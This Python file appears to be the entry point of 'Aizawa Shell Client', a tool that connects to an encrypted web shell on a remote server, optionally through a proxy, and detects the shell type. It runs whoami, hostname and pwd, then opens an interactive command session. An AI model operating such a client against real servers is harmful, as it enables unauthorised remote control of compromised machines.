"""Main entry point for the Aizawa shell client."""

from __future__ import annotations

import asyncio
import getpass
import re
import sys
from argparse import ArgumentParser, Namespace, RawDescriptionHelpFormatter

from aizawa import __version__
from aizawa.core.executor import CommandExecutor
from aizawa.core.validator import InputValidator
from aizawa.http.client import AsyncHttpClient
from aizawa.utils.display import render_banner
from aizawa.utils.terminal import TerminalColors


def parse_command_arguments() -> Namespace:
    """Parse command-line arguments for the application.

    Returns:
        Parsed command-line arguments.

    """
    parser = ArgumentParser(
        description="Aizawa Shell Client",
        formatter_class=RawDescriptionHelpFormatter,
    )

    parser.add_argument(
        "-u",
        "--url",
        help="shell URL",
        type=str,
    )

    parser.add_argument(
        "-k",
        "--key",
        help="shell encryption key",
        type=str,
    )

    parser.add_argument(
        "-p",
        "--proxy",
        help="proxy URL (e.g., http://127.0.0.1:8080)",
        type=str,
    )

    parser.add_argument(
        "-v",
        "--version",
        action="version",
        version=f"Version {__version__}",
    )

    return parser.parse_args()


async def async_main() -> None:
    """Main async application logic."""
    args = parse_command_arguments()

    url: str = args.url if args.url else input("Shell URL: ")
    url = InputValidator.validate_target_url(url)
    encryption_key: str = args.key if args.key else getpass.getpass("Shell KEY: ")

    url_pattern = re.compile(r"^.*\.[a-zA-Z]+", re.MULTILINE)
    url = url_pattern.findall(url)[0]

    async with AsyncHttpClient(proxy_url=args.proxy) as client:
        if args.proxy:
            print(
                f"{TerminalColors.YELLOW}Using proxy: {args.proxy}{TerminalColors.CLEAR}",
            )

        await client.check_connectivity(url)
        headers = await client.fetch_headers(url)
        shell_type = InputValidator.validate_response_headers(headers)
        shell_type = InputValidator.validate_shell_type(shell_type)

        if not await InputValidator.verify_encryption_key(
            client, url, shell_type, encryption_key,
        ):
            sys.exit(1)

        username = await CommandExecutor.run_command(
            client, url, "whoami", shell_type, encryption_key,
        )
        hostname = await CommandExecutor.run_command(
            client, url, "hostname", shell_type, encryption_key,
        )
        working_dir = await CommandExecutor.run_command(
            client, url, "pwd", shell_type, encryption_key,
        )

        username, hostname, working_dir = InputValidator.sanitize_shell_info(
            username or "", hostname or "", working_dir or "",
        )

        await CommandExecutor.interactive_shell(
            client, url, shell_type, username, hostname, working_dir, encryption_key,
        )


def main() -> None:
    """Main entry point for the application."""
    render_banner()
    try:
        asyncio.run(async_main())
    except KeyboardInterrupt:
        print(
            f"\n{TerminalColors.BOLD}{TerminalColors.RED}Ctrl + C detected. Exiting...{TerminalColors.CLEAR}",
        )


if __name__ == "__main__":
    main()
